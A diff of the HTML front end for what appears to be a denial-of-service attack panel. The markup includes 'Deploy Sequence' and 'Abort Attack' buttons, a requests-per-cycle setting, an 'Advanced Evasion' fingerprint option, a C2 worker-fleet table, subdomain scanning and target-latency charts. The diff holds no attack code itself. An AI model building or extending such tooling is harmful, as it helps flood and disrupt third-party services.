+                        <div class="size-8 bg-primary/10 rounded-lg flex items-center justify-center text-primary border border-primary/20">
+                            <span class="material-symbols-rounded">history</span>
+                        </div>
+                        <div>
+                           <h2 class="text-xs font-black uppercase tracking-[0.2em] text-white">Time-Series Analytics Matrix</h2>
+                           <p class="text-[10px] font-mono text-slate-500">Historical combat telemetry & pattern vectors</p>
                         </div>
                     </div>
                     
-                    <div class="flex items-center justify-between p-3 bg-slate-900/50 rounded-xl border border-white/5">
-                        <label for="auto_scale" class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Dynamic Worker Scaling</label>
-                        <input type="checkbox" id="auto_scale" class="rounded bg-slate-800 border-slate-700 text-primary focus:ring-primary focus:ring-offset-slate-900" title="Automatically adjust threads based on system load" value="on" checked>
+                    <div class="flex p-1 bg-slate-950/80 rounded-xl border border-white/10 shadow-inner backdrop-blur-md">
+                        <button onclick="setTimeframe('1M')" id="tf-1M" class="tf-btn px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 text-slate-500 hover:text-white">1M</button>
+                        <button onclick="setTimeframe('5M')" id="tf-5M" class="tf-btn px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 text-slate-500 hover:text-white">5M</button>
+                        <button onclick="setTimeframe('15M')" id="tf-15M" class="tf-btn px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 text-slate-500 hover:text-white">15M</button>
+                        <button onclick="setTimeframe('1H')" id="tf-1H" class="tf-btn active px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 bg-primary/20 text-primary border border-primary/30 shadow-[0_0_10px_rgba(16,185,129,0.2)]">1H</button>
+                        <button onclick="setTimeframe('4H')" id="tf-4H" class="tf-btn px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 text-slate-500 hover:text-white">4H</button>
+                        <button onclick="setTimeframe('1D')" id="tf-1D" class="tf-btn px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 text-slate-500 hover:text-white">1D</button>
+                        <button onclick="setTimeframe('1W')" id="tf-1W" class="tf-btn px-4 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all duration-300 text-slate-500 hover:text-white">1W</button>
                     </div>
+                </div>
 
-                    <div id="rpc-container" class="space-y-4">
-                        <div class="space-y-2">
-                            <label for="rpc" class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requests Per Cycle</label>
-                            <input id="rpc" type="number" value="100" min="1" class="w-full input-pro rounded-xl px-4 py-3" />
+                <!-- Metric Cards -->
+                <div class="grid grid-cols-1 xl:grid-cols-3 gap-8">
+                    <!-- PPS -->
+                    <div class="glass-card rounded-3xl p-8 flex flex-col">
+                        <div class="flex items-center justify-between mb-8">
+                            <div class="flex items-center gap-4">
+                                <div class="size-12 bg-primary/10 rounded-xl flex items-center justify-center text-primary border border-primary/20">
+                                    <span class="material-symbols-rounded text-2xl">insights</span>
+                                </div>
+                                <div>
+                                    <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Session Load</h3>
+                                    <p class="text-xs font-mono text-slate-400 font-bold">PPS (Requests / S)</p>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-4xl font-mono font-black text-white tracking-tighter tabular-nums" id="current-rps">0</div>
+                                <span class="text-[9px] font-bold text-slate-600 uppercase tracking-widest">Peak: <span id="peak-rps">0</span></span>
+                            </div>
                         </div>
-                        <div class="flex items-center justify-between p-3 bg-slate-900/50 rounded-xl border border-white/5">
-                            <label for="smart_rpc" class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Smart RPC Tuning</label>
-                            <input type="checkbox" id="smart_rpc" class="rounded bg-slate-800 border-slate-700 text-primary focus:ring-primary focus:ring-offset-slate-900" title="Dynamically adjust RPC and payloads based on target latency" />
-                        </div>
-                        <div class="flex items-center justify-between p-3 bg-slate-900/50 rounded-xl border border-white/5">
-                            <label for="advanced_evasion" class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Advanced Evasion</label>
-                            <input type="checkbox" id="advanced_evasion" class="rounded bg-slate-800 border-slate-700 text-warning focus:ring-warning focus:ring-offset-slate-900" title="Use realistic dynamic browser fingerprints (Higher CPU)" />
+                        <div class="h-40 w-full relative">
+                            <canvas id="rpsChart"></canvas>
                         </div>
                     </div>
-                </div>
-            </section>
-        </div>
 
-        <!-- System Controls -->
-        <div class="p-8 border-t border-white/5 bg-slate-950/40">
-            <button id="start-btn" onclick="startAttack()" class="btn-action w-full bg-primary hover:bg-primary-dark text-slate-950 rounded-2xl shadow-lg shadow-primary/20">
-                <span class="material-symbols-rounded font-bold">bolt</span>
-                Deploy Sequence
-            </button>
-            <button id="stop-btn" onclick="stopAttack()" class="btn-action w-full mt-4 bg-slate-900 border border-danger/30 text-danger hover:bg-danger/10 rounded-2xl hidden">
-                <span class="material-symbols-rounded">stop_circle</span>
-                Abort Attack
-            </button>
-            <div id="action-loader" class="mt-4 flex items-center justify-center gap-3 text-slate-500 font-mono text-[10px] uppercase tracking-widest hidden">
-                <span class="material-symbols-rounded animate-spin">sync</span>
-                Initializing Neural Uplink...
-            </div>
-        </div>
-    </aside>
+                    <!-- BPS -->
+                    <div class="glass-card rounded-3xl p-8 flex flex-col">
+                        <div class="flex items-center justify-between mb-8">
+                            <div class="flex items-center gap-4">
+                                <div class="size-12 bg-secondary/10 rounded-xl flex items-center justify-center text-secondary border border-secondary/20">
+                                    <span class="material-symbols-rounded text-2xl">waves</span>
+                                </div>
+                                <div>
+                                    <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Pipeline Saturation</h3>
+                                    <p class="text-xs font-mono text-slate-400 font-bold">BPS (Throughput / S)</p>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-4xl font-mono font-black text-white tracking-tighter tabular-nums" id="current-bps">0 B</div>
+                                <span class="text-[9px] font-bold text-slate-600 uppercase tracking-widest">Peak: <span id="peak-bps">0 B</span></span>
+                            </div>
+                        </div>
+                        <div class="h-40 w-full relative">
+                            <canvas id="bpsChart"></canvas>
+                        </div>
+                    </div>
 
-    <!-- MAIN DASHBOARD -->
-    <main id="main-content" class="flex-1 flex flex-col min-w-0 bg-slate-950 relative">
-        <!-- Top Status Bar -->
-        <header class="h-20 border-b border-white/5 flex items-center justify-between px-8 shrink-0 glass-panel relative z-20">
-            <div class="flex items-center gap-8">
-                <div class="flex flex-col">
-                    <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest italic">Grid Uplink</span>
-                    <div class="flex items-center gap-2 mt-1">
-                        <span id="header-status-text" class="text-xs font-mono font-bold text-slate-400">CONNECTING_...</span>
-                    </div>
-                </div>
-                <div class="h-8 w-px bg-white/5"></div>
-                <div class="flex flex-col">
-                    <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest italic">Core Engine</span>
-                    <div class="flex items-center gap-2 mt-1">
-                        <span class="text-xs font-mono font-bold text-primary">STABLE_SECURE</span>
-                    </div>
-                </div>
-                <div class="h-8 w-px bg-white/5"></div>
-                <div class="flex flex-col">
-                    <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest italic">C2 Node ID</span>
-                    <div class="flex items-center gap-2 mt-1">
-                        <span id="c2-node-id" class="text-xs font-mono font-bold text-secondary">AWAITING_SYNC</span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="flex items-center gap-6">
-                <div class="text-right hidden sm:block">
-                    <span class="text-[9px] font-black text-slate-600 uppercase tracking-widest block">System Cipher</span>
-                    <span class="text-xs font-mono text-slate-400">RSA-4096-AES-GCM</span>
-                </div>
-                <div class="h-8 w-px bg-white/5 hidden sm:block"></div>
-                <button onclick="openToolsModal()" title="Tactical Tools" class="size-10 rounded-xl bg-slate-900 border border-white/5 flex items-center justify-center text-slate-500 hover:text-primary transition-colors">
-                    <span class="material-symbols-rounded text-2xl">construction</span>
-                </button>
-                <button title="System Settings" class="size-10 rounded-xl bg-slate-900 border border-white/5 flex items-center justify-center text-slate-500 hover:text-white transition-colors">
-                    <span class="material-symbols-rounded text-2xl">settings_input_component</span>
-                </button>
-            </div>
-        </header>
-
-        <!-- Tools Modal -->
-        <div id="tools-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm hidden opacity-0 transition-opacity duration-300">
-            <div class="glass-card bg-slate-900 w-full max-w-3xl rounded-3xl p-8 border border-white/10 shadow-2xl relative translate-y-4 transition-transform duration-300" id="tools-modal-content">
-                <button onclick="closeToolsModal()" class="absolute top-6 right-6 text-slate-500 hover:text-white transition-colors">
-                    <span class="material-symbols-rounded">close</span>
-                </button>
-                
-                <div class="mb-6 flex items-center gap-4">
-                    <div class="size-10 bg-secondary/10 rounded-xl flex items-center justify-center text-secondary border border-secondary/20">
-                        <span class="material-symbols-rounded">construction</span>
-                    </div>
-                    <div>
-                        <h2 class="text-xl font-black uppercase tracking-wider text-white">Tactical Recon Tools</h2>
-                        <p class="text-xs font-mono text-slate-400 mt-1">Execute diagnostic protocols on target infrastructure.</p>
+                    <!-- Latency -->
+                    <div class="glass-card rounded-3xl p-8 flex flex-col">
+                        <div class="flex items-center justify-between mb-8">
+                            <div class="flex items-center gap-4">
+                                <div class="size-12 bg-warning/10 rounded-xl flex items-center justify-center text-warning border border-warning/20">
+                                    <span class="material-symbols-rounded text-2xl">timer</span>
+                                </div>
+                                <div>
+                                    <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Target Health</h3>
+                                    <p class="text-xs font-mono text-slate-400 font-bold">Latency (ms)</p>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-4xl font-mono font-black text-white tracking-tighter tabular-nums" id="current-latency">0ms</div>
+                                <span class="text-[9px] font-bold text-slate-600 uppercase tracking-widest">Peak: <span id="peak-latency">0ms</span></span>
+                            </div>
+                        </div>
+                        <div class="h-40 w-full relative">
+                            <canvas id="latencyChart"></canvas>
+                        </div>
                     </div>
                 </div>
 
-                <!-- Tool Navigation -->
-                <div class="flex gap-2 p-1 bg-slate-950 rounded-xl border border-white/5 mb-6">
-                    <button onclick="switchToolTab('ping')" id="tab-ping" class="tool-tab flex-1 py-2 px-4 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all bg-primary text-slate-950">ICMP Ping</button>
-                    <button onclick="switchToolTab('check')" id="tab-check" class="tool-tab flex-1 py-2 px-4 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all text-slate-500 hover:text-white">Status Check</button>
-                    <button onclick="switchToolTab('info')" id="tab-info" class="tool-tab flex-1 py-2 px-4 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all text-slate-500 hover:text-white">Geo-IP Recon</button>
-                </div>
+                <!-- Recon & Subdomains -->
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-8" id="intelligence-section">
+                    <!-- Map & Geo IP -->
+                    <div class="glass-card rounded-3xl p-8 flex flex-col min-h-[480px]">
+                        <div class="flex items-center justify-between mb-6">
+                            <div class="flex items-center gap-4">
+                                <div class="size-10 bg-secondary/10 rounded-xl flex items-center justify-center text-secondary border border-secondary/20">
+                                    <span class="material-symbols-rounded">public</span>
+                                </div>
+                                <div>
+                                    <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Geographical Recon</h3>
+                                    <p class="text-xs font-mono text-slate-400 font-bold">Visual Asset Mapping</p>
+                                </div>
+                            </div>
+                            <div id="recon-waf-badge"></div>
+                        </div>
+                        <div id="tactical-map" class="mb-6 bg-slate-900/50"></div>
+                        <div class="grid grid-cols-2 gap-4 text-[10px] font-mono">
+                            <div class="p-3 bg-slate-900/50 rounded-xl border border-white/5">
+                                <span class="text-slate-600 block mb-1 uppercase">Tactical Provider</span>
+                                <span id="geo-isp" class="text-slate-300 font-bold truncate block">WAITING_...</span>
+                            </div>
+                            <div class="p-3 bg-slate-900/50 rounded-xl border border-white/5">
+                                <span class="text-slate-600 block mb-1 uppercase">Neural Location</span>
+                                <span id="geo-loc" class="text-slate-300 font-bold truncate block">WAITING_...</span>
+                            </div>
+                        </div>
+                    </div>
 
-                <!-- Tool Content -->
-                <div class="space-y-6">
-                    <!-- Universal Input -->
-                    <div class="space-y-2">
-                        <label id="tool-input-label" for="tool-target" class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Target Host / IP</label>
-                        <div class="flex gap-3">
-                            <input id="tool-target" type="text" placeholder="example.com" class="flex-1 input-pro rounded-xl px-4 py-3" />
-                            <button onclick="executeTool()" id="tool-exec-btn" class="px-8 bg-primary text-slate-950 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-primary-light transition-all shadow-lg shadow-primary/20 flex items-center gap-2">
-                                <span class="material-symbols-rounded text-lg">play_arrow</span>
-                                Run
+                    <!-- Subdomains -->
+                    <div class="glass-card rounded-3xl p-8 flex flex-col min-h-[480px]">
+                        <div class="flex items-center justify-between mb-6">
+                            <div class="flex items-center gap-4">
+                                <div class="size-10 bg-primary/10 rounded-xl flex items-center justify-center text-primary border border-primary/20">
+                                    <span class="material-symbols-rounded">target</span>
+                                </div>
+                                <div>
+                                    <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Surface Explorer</h3>
+                                    <p class="text-xs font-mono text-slate-400 font-bold">Subdomain Vulnerabilities</p>
+                                </div>
+                            </div>
+                            <button id="subdomain-scan-btn" onclick="scanSubdomains()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all flex items-center gap-2">
+                                <span class="material-symbols-rounded text-sm">radar</span> Scan Network
                             </button>
                         </div>
-                    </div>
-
-                    <!-- Result Area -->
-                    <div id="tool-result" class="bg-slate-950 border border-white/5 rounded-2xl p-6 min-h-[200px] max-h-[350px] overflow-y-auto font-mono text-xs text-slate-400 custom-scrollbar">
-                        <div class="h-full flex items-center justify-center text-slate-600 italic">
-                            Waiting for diagnostic request...
+                        <div class="flex-1 overflow-y-auto custom-scrollbar border border-white/5 rounded-2xl bg-slate-950/50">
+                            <table class="w-full text-left text-[11px] font-mono">
+                                <thead class="text-slate-600 border-b border-white/5 sticky top-0 bg-slate-900 z-10">
+                                    <tr>
+                                        <th class="py-3 px-4">ENDPOINT</th>
+                                        <th class="py-3 px-4">IP_NODE</th>
+                                        <th class="py-3 px-4 text-right">TACTICAL</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="subdomain-results" class="divide-y divide-white/5">
+                                    <tr>
+                                        <td colspan="3" class="py-12 text-center text-slate-600 italic">No targets discovered.</td>
+                                    </tr>
+                                </tbody>
+                            </table>
                         </div>
                     </div>
                 </div>
-            </div>
-        </div>
 
-        <!-- Visualization Area -->
-        <div class="p-8 flex-1 overflow-y-auto space-y-8 scroll-smooth">
-            <!-- Metric Cards -->
-            <div class="grid grid-cols-1 xl:grid-cols-3 gap-8">
-                <!-- PPS -->
-                <div class="glass-card rounded-3xl p-8 flex flex-col">
-                    <div class="flex items-center justify-between mb-8">
-                        <div class="flex items-center gap-4">
-                            <div class="size-12 bg-primary/10 rounded-xl flex items-center justify-center text-primary border border-primary/20">
-                                <span class="material-symbols-rounded text-2xl">insights</span>
-                            </div>
-                            <div>
-                                <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Session Load</h3>
-                                <p class="text-xs font-mono text-slate-400 font-bold">PPS (Requests / S)</p>
-                            </div>
-                        </div>
-                        <div class="text-right">
-                            <div class="text-4xl font-mono font-black text-white tracking-tighter tabular-nums" id="current-rps">0.00</div>
-                            <span class="text-[9px] font-bold text-slate-600 uppercase tracking-widest">Peak: <span id="peak-rps">0.00</span></span>
-                        </div>
-                    </div>
-                    <div class="h-40 w-full relative">
-                        <canvas id="rpsChart"></canvas>
-                    </div>
-                </div>
-
-                <!-- BPS -->
-                <div class="glass-card rounded-3xl p-8 flex flex-col">
-                    <div class="flex items-center justify-between mb-8">
-                        <div class="flex items-center gap-4">
-                            <div class="size-12 bg-secondary/10 rounded-xl flex items-center justify-center text-secondary border border-secondary/20">
-                                <span class="material-symbols-rounded text-2xl">waves</span>
-                            </div>
-                            <div>
-                                <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Pipeline Saturation</h3>
-                                <p class="text-xs font-mono text-slate-400 font-bold">BPS (Throughput / S)</p>
-                            </div>
-                        </div>
-                        <div class="text-right">
-                            <div class="text-4xl font-mono font-black text-white tracking-tighter tabular-nums" id="current-bps">0.00 B</div>
-                            <span class="text-[9px] font-bold text-slate-600 uppercase tracking-widest">Peak: <span id="peak-bps">0.00 B</span></span>
-                        </div>
-                    </div>
-                    <div class="h-40 w-full relative">
-                        <canvas id="bpsChart"></canvas>
-                    </div>
-                </div>
-
-                <!-- LATENCY -->
-                <div class="glass-card rounded-3xl p-8 flex flex-col">
-                    <div class="flex items-center justify-between mb-8">
-                        <div class="flex items-center gap-4">
-                            <div class="size-12 bg-warning/10 rounded-xl flex items-center justify-center text-warning border border-warning/20">
-                                <span class="material-symbols-rounded text-2xl">timer</span>
-                            </div>
-                            <div>
-                                <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Target Health</h3>
-                                <p class="text-xs font-mono text-slate-400 font-bold">Latency (ms)</p>
-                            </div>
-                        </div>
-                        <div class="text-right">
-                            <div class="text-4xl font-mono font-black text-white tracking-tighter tabular-nums" id="current-latency">0 ms</div>
-                            <span class="text-[9px] font-bold text-slate-600 uppercase tracking-widest">Peak: <span id="peak-latency">0 ms</span></span>
-                        </div>
-                    </div>
-                    <div class="h-40 w-full relative">
-                        <canvas id="latencyChart"></canvas>
-                    </div>
-                </div>
-            </div>
-
-            <!-- INTELLIGENCE RECON MATRIX -->
-            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8" id="intelligence-section">
-                <!-- Tactical Map & Geo-IP -->
-                <div class="glass-card rounded-3xl p-8 flex flex-col min-h-[480px]">
+                <!-- C2 Worker Fleet -->
+                <div class="glass-card rounded-3xl p-8 flex flex-col min-h-[250px]">
                     <div class="flex items-center justify-between mb-6">
                         <div class="flex items-center gap-4">
                             <div class="size-10 bg-secondary/10 rounded-xl flex items-center justify-center text-secondary border border-secondary/20">
-                                <span class="material-symbols-rounded">public</span>
+                                <span class="material-symbols-rounded">dns</span>
                             </div>
                             <div>
-                                <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Geographical Recon</h3>
-                                <p class="text-xs font-mono text-slate-400 font-bold">Visual Asset Mapping</p>
+                                <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">C2 Worker Fleet</h3>
+                                <p class="text-xs font-mono text-slate-400 font-bold">Connected Nodes: <span id="c2-worker-count" class="text-secondary">0</span></p>
                             </div>
                         </div>
-                        <div id="recon-waf-badge"></div>
-                    </div>
-                    <div id="tactical-map" class="mb-6 bg-slate-900/50"></div>
-                    <div class="grid grid-cols-2 gap-4 text-[10px] font-mono">
-                        <div class="p-3 bg-slate-900/50 rounded-xl border border-white/5">
-                            <span class="text-slate-600 block mb-1 uppercase">Tactical Provider</span>
-                            <span id="geo-isp" class="text-slate-300 font-bold truncate block">WAITING_...</span>
-                        </div>
-                        <div class="p-3 bg-slate-900/50 rounded-xl border border-white/5">
-                            <span class="text-slate-600 block mb-1 uppercase">Neural Location</span>
-                            <span id="geo-loc" class="text-slate-300 font-bold truncate block">WAITING_...</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Subdomain Explorer -->
-                <div class="glass-card rounded-3xl p-8 flex flex-col min-h-[480px]">
-                    <div class="flex items-center justify-between mb-6">
-                        <div class="flex items-center gap-4">
-                            <div class="size-10 bg-primary/10 rounded-xl flex items-center justify-center text-primary border border-primary/20">
-                                <span class="material-symbols-rounded">target</span>
-                            </div>
-                            <div>
-                                <h3 class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Surface Explorer</h3>
-                                <p class="text-xs font-mono text-slate-400 font-bold">Subdomain Vulnerabilities</p>
-                            </div>
-                        </div>
-                        <button onclick="scanSubdomains()" id="subdomain-scan-btn" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all flex items-center gap-2">
-                            <span class="material-symbols-rounded text-sm">radar</span>
-                            Scan Network
+                        <button onclick="refreshC2Nodes()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all flex items-center gap-2">
+                            <span class="material-symbols-rounded text-sm">refresh</span> Sync Grid
                         </button>
                     </div>
                     <div class="flex-1 overflow-y-auto custom-scrollbar border border-white/5 rounded-2xl bg-slate-950/50">
                         <table class="w-full text-left text-[11px] font-mono">
                             <thead class="text-slate-600 border-b border-white/5 sticky top-0 bg-slate-900 z-10">
                                 <tr>
-                                    <th class="py-3 px-4">ENDPOINT</th>
-                                    <th class="py-3 px-4">IP_NODE</th>
-                                    <th class="py-3 px-4 text-right">TACTICAL</th>
+                                    <th class="py-3 px-4">NODE_ID</th>
+                                    <th class="py-3 px-4">HOSTNAME / OS</th>
+                                    <th class="py-3 px-4">CPU / RAM</th>
+                                    <th class="py-3 px-4 text-right">STATUS</th>
                                 </tr>
                             </thead>
-                            <tbody id="subdomain-results" class="divide-y divide-white/5">
+                            <tbody id="c2-worker-list" class="divide-y divide-white/5">
                                 <tr>
-                                    <td colspan="3" class="py-12 text-center text-slate-600 italic">No targets discovered.</td>
+                                    <td colspan="4" class="py-8 text-center text-slate-600 italic">No worker nodes connected.</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
                 </div>
-            </div>
 
-            <!-- INTELLIGENCE LOGS -->
-            <div class="flex-1 flex flex-col bg-slate-950 border border-white/5 rounded-3xl overflow-hidden shadow-2xl min-h-[500px]">
-                <!-- Log Toolbar -->
-                <div class="px-8 py-4 bg-slate-900/50 border-b border-white/5 flex items-center justify-between shrink-0">
-                    <div class="flex items-center gap-6">
-                        <div class="flex items-center gap-2">
-                            <div class="size-2 bg-primary rounded-full pulse-active"></div>
-                            <span class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-400">Live Matrix</span>
+                <!-- Live Matrix (Log) -->
+                <div class="flex-1 flex flex-col bg-slate-950 border border-white/5 rounded-3xl overflow-hidden shadow-2xl min-h-[500px]">
+                    <div class="px-8 py-4 bg-slate-900/50 border-b border-white/5 flex items-center justify-between shrink-0">
+                        <div class="flex items-center gap-6">
+                            <div class="flex items-center gap-2">
+                                <div class="size-2 bg-primary rounded-full pulse-active"></div>
+                                <span class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-400">Live Matrix</span>
+                            </div>
+                            <div class="h-6 w-px bg-white/10"></div>
+                            <nav class="flex gap-2" aria-label="Log Filter">
+                                <button onclick="setLogFilter('ALL')" id="filter-ALL" class="filter-chip active px-3 py-1 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all">All</button>
+                                <button onclick="setLogFilter('ATTACK')" id="filter-ATTACK" class="filter-chip px-3 py-1 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all text-slate-500">Attack</button>
+                                <button onclick="setLogFilter('SYSTEM')" id="filter-SYSTEM" class="filter-chip px-3 py-1 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all text-slate-500">System</button>
+                                <button onclick="setLogFilter('ERROR')" id="filter-ERROR" class="filter-chip px-3 py-1 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all text-slate-500">Errors</button>
+                            </nav>
+                            <div class="h-6 w-px bg-white/10 mx-2"></div>
+                            <div class="flex items-center gap-3">
+                                <span class="text-[9px] font-black uppercase text-slate-600 tracking-widest italic">Intensity</span>
+                                <select onchange="setLogLevel(this.value)" id="log-level-selector" class="bg-slate-950 border border-white/5 text-slate-400 text-[10px] font-bold rounded-lg px-3 py-1 outline-none focus:border-primary/50 transition-all cursor-pointer hover:bg-slate-900">
+                                    <option value="DEBUG">VERBOSE</option>
+                                    <option value="INFO" selected>TACTICAL</option>
+                                    <option value="ERROR">MINIMAL</option>
+                                </select>
+                            </div>
                         </div>
-                        <div class="h-6 w-px bg-white/10"></div>
-                        <nav class="flex gap-2" aria-label="Log Filter">
-                            <button onclick="setLogFilter('ALL')" id="filter-ALL" class="filter-chip active px-3 py-1 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all">All</button>
-                            <button onclick="setLogFilter('ATTACK')" id="filter-ATTACK" class="filter-chip px-3 py-1 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all">Attack</button>
-                            <button onclick="setLogFilter('SYSTEM')" id="filter-SYSTEM" class="filter-chip px-3 py-1 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all">System</button>
-                            <button onclick="setLogFilter('ERROR')" id="filter-ERROR" class="filter-chip px-3 py-1 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all">Errors</button>
-                        </nav>
-                        <div class="h-6 w-px bg-white/10 mx-2"></div>
-                        <div class="flex items-center gap-3">
-                            <span class="text-[9px] font-black uppercase text-slate-600 tracking-widest italic">Intensity</span>
-                            <select onchange="setLogLevel(this.value)" id="log-level-selector" class="bg-slate-950 border border-white/5 text-slate-400 text-[10px] font-bold rounded-lg px-3 py-1 outline-none focus:border-primary/50 transition-all cursor-pointer hover:bg-slate-900">
-                                <option value="DEBUG">VERBOSE</option>
-                                <option value="INFO" selected>TACTICAL</option>
-                                <option value="ERROR">MINIMAL</option>
-                            </select>
+                        <div class="flex gap-4">
+                            <button onclick="copyLogs()" class="text-[10px] font-black text-slate-500 hover:text-white uppercase tracking-widest flex items-center gap-2 transition-colors">
+                                <span class="material-symbols-rounded text-lg">content_copy</span>
+                                Export
+                            </button>
+                            <button onclick="clearTerminal()" class="text-[10px] font-black text-slate-500 hover:text-warning uppercase tracking-widest flex items-center gap-2 transition-colors">
+                                <span class="material-symbols-rounded text-lg">delete_sweep</span>
+                                Flush
+                            </button>
                         </div>
                     </div>
-                    <div class="flex gap-4">
-                        <button onclick="copyLogs()" class="text-[10px] font-black text-slate-500 hover:text-white uppercase tracking-widest flex items-center gap-2 transition-colors">
-                            <span class="material-symbols-rounded text-lg">content_copy</span>
-                            Export
-                        </button>
-                        <button onclick="clearTerminal()" class="text-[10px] font-black text-slate-500 hover:text-warning uppercase tracking-widest flex items-center gap-2 transition-colors">
-                            <span class="material-symbols-rounded text-lg">delete_sweep</span>
-                            Flush
-                        </button>
+                    
+                    <div id="terminal-content" class="flex-1 overflow-y-auto p-6 terminal-log scroll-smooth" aria-live="polite">
+                        <div class="log-entry flex gap-4 text-slate-500" data-type="SYSTEM">
+                            <span class="shrink-0 text-primary font-bold opacity-50">[SYSTEM]</span>
+                            <span>Tactical initialization complete. Waiting for deployment...</span>
+                        </div>
+                    </div>
+
+                    <div class="px-8 py-2 bg-black/40 border-t border-white/5 flex items-center justify-between text-[9px] font-mono text-slate-700 font-black uppercase tracking-widest">
+                        <span>BUFFER_CAP: 500_UNITS</span>
+                        <span id="session-uuid">AWAITING_SEQUENCE</span>
                     </div>
                 </div>
-                <!-- Log Console -->
-                <div id="terminal-content" class="flex-1 overflow-y-auto p-6 terminal-log scroll-smooth" aria-live="polite">
-                    <div class="log-entry flex gap-4 text-slate-500" data-type="SYSTEM">
-                        <span class="shrink-0 text-primary font-bold opacity-50">[SYSTEM]</span>
-                        <span>Tactical initialization complete. Waiting for deployment...</span>
+            </div>
+
+            <!-- Footer -->
+            <footer class="h-16 border-t border-white/5 px-8 flex items-center justify-between shrink-0 bg-slate-950/80 backdrop-blur-md">
+                <div class="flex items-center gap-6 text-[10px] font-bold text-slate-600 uppercase tracking-[0.2em]">
+                    <div class="flex items-center gap-2">
+                        <span class="material-symbols-rounded text-sm">security</span> E2EE_ACTIVE
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="material-symbols-rounded text-sm">hub</span> CLUSTER_NODES: 1
                     </div>
                 </div>
-                <!-- Log Footer -->
-                <div class="px-8 py-2 bg-black/40 border-t border-white/5 flex items-center justify-between text-[9px] font-mono text-slate-700 font-black uppercase tracking-widest">
-                    <span>BUFFER_CAP: 500_UNITS</span>
-                    <span id="session-uuid">UUID: INERT_STATE</span>
-                </div>
-            </div>
-        </div>
+                <p class="text-[10px] font-mono text-slate-700 italic">SECURE_DASHBOARD_V1.1.3_BUILD_2026</p>
+            </footer>
+        </main>
+    </div>
 
-        <footer class="h-16 border-t border-white/5 px-8 flex items-center justify-between shrink-0 bg-slate-950/80 backdrop-blur-md">
-            <div class="flex items-center gap-6 text-[10px] font-bold text-slate-600 uppercase tracking-[0.2em]">
-                <div class="flex items-center gap-2">
-                    <span class="material-symbols-rounded text-sm">security</span>
-                    E2EE_ACTIVE
-                </div>
-                <div class="flex items-center gap-2">
-                    <span class="material-symbols-rounded text-sm">hub</span>
-                    CLUSTER_NODES: 1
-                </div>
-            </div>
-            <p class="text-[10px] font-mono text-slate-700 italic">SECURE_DASHBOARD_V1.1.2_BUILD_2026</p>
-        </footer>
-    </main>
-</div>
-
-<!-- Config Modal -->
-<div id="config-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm hidden opacity-0 transition-opacity duration-300">
-    <div class="glass-card bg-slate-900 w-full max-w-2xl rounded-3xl p-8 border border-white/10 shadow-2xl relative translate-y-4 transition-transform duration-300" id="config-modal-content">
-        <button onclick="closeConfigModal()" class="absolute top-6 right-6 text-slate-500 hover:text-white transition-colors">
-            <span class="material-symbols-rounded">close</span>
-        </button>
-        
-        <div class="mb-6 flex items-center justify-between">
-            <div class="flex items-center gap-4">
+    <!-- Config Modal -->
